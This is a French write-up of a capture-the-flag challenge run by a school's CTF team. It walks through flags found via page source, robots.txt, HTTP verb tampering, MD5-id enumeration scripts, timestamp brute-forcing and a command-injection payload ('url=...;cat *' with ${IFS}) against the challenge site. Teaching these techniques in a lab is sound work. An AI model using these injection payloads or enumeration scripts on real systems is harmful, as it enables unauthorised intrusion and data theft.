JPO Challenge Writeup

Introduction

Ce writeup présente la solution du challenge des Journées Portes Ouvertes de l'ENSIBS.
Créé par l'équipe CTF (MAK'HACK) de l'ENSIBS, ce challenge avait pour but de faire découvrir le monde de la cybersécurité aux futurs étudiants de l'ENSIBS.

Le challenge est un CTF de niveau débutant / intermédiaire, composé de 7 flags au total répartis sur un site web.

Prérequis

  • Un navigateur web
  • Un scanneur d'URI (type FFUF, Gobuster, etc.)
  • Python ou un autre langage de programmation

Résolution

Flag 1

Le premier flag était simplement caché dans le code source de la page d'accueil du site web. Il suffisait de regarder le code source de la page pour le trouver.

curl https://jpo.cyberlog.dev/ | grep CLOG
=> <p hidden> CLOG{1st_ch4ll3ng3_1s_4lw4ys_3asy}</p>

Flag 2

Pour trouver le second flag, il fallait analyser les différents fichiers et dossiers présents sur le site web.
En fouillant un peu on trouve un fichier JS : https://jpo.cyberlog.dev/js/index_public.js qui semble lui même faire appel à https://jpo.cyberlog.dev/js/Module_Chrono.js.
En regardant le contenu de ce fichier, on trouve le flag.

curl https://jpo.cyberlog.dev/js/Module_Chrono.js | grep CLOG
=> flag : CLOG{2nd_flag_h1dd3n_1n_r4nd0m_pl4c3}

Flag 3

Le troisième flag était caché dans un fichier JSON. Pour le trouver, il fallait simplement télécharger le fichier https://jpo.cyberlog.dev/flag et regarder son contenu.
Sachant que les flags commence par CLOG{, on peut simplement chercher ce motif dans le fichier.

curl https://jpo.cyberlog.dev/flag -o flag.json
cat flag.json | grep CLOG
=> "flag": "CLOG{3rd_flag_l4st_ea5y_0ne!!!}",

Flag 4

Le quatrième flag demandait un peu plus de réflexion.
Un fichier robots.txt était présent sur le site web (contient une liste des ressources du site qui ne sont pas censées être indexées par les robots d'indexation des moteurs de recherche).
En regardant le contenu de ce fichier, on trouve une URL qui semble intéressante : /__secretPROJECT__/.

curl https://jpo.cyberlog.dev/robots.txt

    User-agent: *
    Disallow: /intranetCompany/

    User-agent: *
    Allow: /

En allant sur l'URL /intranetCompany/, on trouve une page de Login classique avec un champ username et un champ password.

Lors d'un login, le site fait un appel à l'endpoint /intranetCompany/loginINTRANET en POST.

En modifiant la requête pour regarder quelles sont les méthodes acceptées, on trouve que l'endpoint /intranetCompany/loginINTRANET accepte les requêtes GET et POST.

curl -X OPTIONS https://jpo.cyberlog.dev/intranetCompany/loginINTRANET
=> Allow: GET,POST,HEAD

On renvoie une requête mais cette fois-ci en GET pour voir si le site nous renvoie quelque chose.

curl -X GET https://jpo.cyberlog.dev/intranetCompany/loginINTRANET
    <html>
    <head>
    <title>INTRANET</title>
    </head>
    <body>
    <h1>For authorized personnel only</h1>
    <p> We have set up a debugonly account for you to use, the username and password are both debugONLY</p>
    PS: <p hidden> CLOG{4th_V3rb_T4mpering_1N_A_NuTsh3ll}</p>
    </body>
    </html>

Le 4ème flag est donc CLOG{4th_V3rb_T4mpering_1N_A_NuTsh3ll}. On trouve également un couple username et password pour se connecter à l'intranet (debugONLY).

Flag 5

Les identifiants debugONLY nous permettent de nous connecter à l'intranet.
C'est une page classique avec 3 employés et des notes sur eux.

Le lien de la note pour la première employée est https://jpo.cyberlog.dev/intranetCompany/debugONLY?id_notes=c4ca4238a0b923820dcc509a6f75849b.
Le paramètre id_notes semble être un hash, avec des sites comme md5hashing.net on trouve que c4ca4238a0b923820dcc509a6f75849b correspond à 1.

Pour les deux autres employés, on trouve que c81e728d9d4c2f636f067f89cc14862c correspond à 2 et eccbc87e4b5ce2fe28308fd9f2a7baf3 correspond à 3.
On va donc mettre en place un script pour tenter de trouver des notes sur d'autres employés.

for i in range(4,100):
    id_notes = hashlib.md5(str(i).encode()).hexdigest()
    response = session.get(f"{url_challenge}/intranetCompany/debugONLY?id_notes={id_notes}")
    if "Employés" not in response.text:
        print(f"[+] Found note {id_notes} <=> id = {i}")
    else : 
        pass

En laissant tourner le script : [+] Found note ad61ab143223efbc24c7d2583be69251 <=> id = 74
Avec un CURL sur l'URL https://jpo.cyberlog.dev/intranetCompany/debugONLY?id_notes=ad61ab143223efbc24c7d2583be69251, on récupère une note sur l'employé REDACTED qui nous donne des instructions pour récupérer un dossier zippé.

curl -b "cookies=67b27879506e6863f8760faf4a183729b9777f81" https://jpo.cyberlog.dev/intranetCompany/debugONLY?id_notes=ad61ab143223efbc24c7d2583be69251 -X GET
"Nous avons sélectionné REDACTED pour ses aptitudes hors du commun. Je pense que c'est l'élément qui nous manquait pour faire décoller notre projet ... Lui transmettre ces instructions (/zip_dossier:mdp(ID+[space])) et le laisser travailler. Il saura quoi faire."

En allant sur l'URL /zip_dossier/REDACTED.zip, on trouve un fichier zip composé de 16 morceaux de QR Codes.
On trouve que les dimensions d'un morceau est 253*263 pixels.
On peut donc les assembler pour former un QR Code complet.

from PIL import Image

new_image = Image.new('RGB', (4*253, 4*263))

for i in range(1, 5):
    for j in range(1, 5):
        img = Image.open(f'row-{i}-column-{j}.png')
        new_image.paste(img, ((j-1)*253, (i-1)*263))

new_image.show()

On scanne le QR Code obtenu pour trouver :

Dans l'attente d'instructions, connectez-vous via le login avec les identifiants temporaires : REDACTED / TEMPORARY_PASSWORD_69420

En allant sur l'URL /intranetCompany/loginINTRANET avec les identifiants temporaires, on trouve le 5ème flag : CLOG{5th_Wh0_1s_3mpl0y33_0f_th3_y34r?}.

Flag 6

En scrollant un peu la page on trouve un lien vers /csssr.secorg/. (https://jpo.cyberlog.dev/csssr.secorg/)

Le lien présente les membres de CSSSR et un boutton Connect with token.

On peut cliquer sur le boutton pour voir ce qu'il se passe.
On est redirigé vers une page /csssr.secorg/members/ avec un message Welcome back dear member of the CSSSR. mais rien de plus.

En regardant les cookies, on trouve un cookie jwt qui semble être un token JWT.

Flag 7

La partie la plus difficile du challenge était de trouver le dernier flag.
Un système de notes était présent depuis le pannel admin que nous avons découvert précédemment.

En essayant d'envoyer une note, l'application fait un appel à l'endpoint /downloadTASK-S.L en POST.
La sortie est un fichier JSON avec un timestamp et le contenu de la note.

En regardant les notes déjà présentes, on trouve que les notes sont stockées dans le dossier /TASKS_UPLOADER/ et que le nom du fichier est le timestamp de la note (en millisecondes).
Des notes sont datées du 01/02/2024, les plus intéressantes par logique sont les plus récentes.

"01/02/2024 13:59:23"
1	"01/02/2024 13:59:46"
2	"01/02/2024 14:01:58"
3	"01/02/2024 14:04:02"
4	"01/02/2024 14:06:01"
5	"01/02/2024 14:15:56"

Et là, surprise les notes sont horodatées mais en secondes !
Par le biais d'une faille de type Timestamp Attack, on peut récupérer les notes les plus récentes.

def brute_force(first, end):
    for i in range(first, end):
        response = session.get(f"{url_challenge}/TASKS_UPLOADER{i}")
        if "ENOENT" not in response.text:
            print(f"\033[92m[+] OK, found {i}\033[0m")
            all_founded.append(i)
            print(response.text)
            print("\n")

dict_timestamp = {
    "1706795963000":"1706795964000", # 01/02/2024 13:59:23
    "1706795986000":"1706795987000", # 01/02/2024 13:59:46
    "1706796118000":"1706796119000", # 01/02/2024 14:01:58
    "1706796242000":"1706796243000", # 01/02/2024 14:04:02
    "1706796361000":"1706796362000", # 01/02/2024 14:06:01
    "1706796956000":"1706796957000", # 01/02/2024 14:15:56
}

threads = []
for start, end in dict_timestamp.items():
    thread = threading.Thread(target=brute_force, args=(int(start), int(end)))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()

On utilise des threads pour accélérer le processus.

Nous sommes amenés sur une page /AdminENDPOINT_CSSSR_WEBSITE/ qui contient une fonctionnalité de test de connexion à des sites web.

La page fait une requête POST vers l'endpoint /testConnectionWebPages avec un paramètre url qui est l'URL du site web à tester.

Par exmeple avec url=https%3A%2F%2Fyoutube.com, on obtient une réponse de la part du site web :

On peut deviner que commande de type curl -I https://m58.fr est exécutée, essayons de voir si on peut exécuter des commandes arbitraires.

Le serveur est bien vulnérable à une attaque de type Command Injection.
Allons récupérer le dernier flag !
Allons voir dans le dossier /public si on trouve quelque chose d'intéressant.
Mais suprise url=https%3A%2F%2Fm58.fr;cat * ne fonctionne pas car un espace est ajouté entre cat et *.
Pour contrer cela, on peut utiliser un URL Encoded pour l'espace %20 ou ${IFS} pour un espace.

On trouve un dossier YepYouDeservedIt qui contient un fichier flag.txt avec le dernier flag : CLOG{7th_Fr0m_Intern_To_Adm1n_of_Csssr_Webs1te?}.
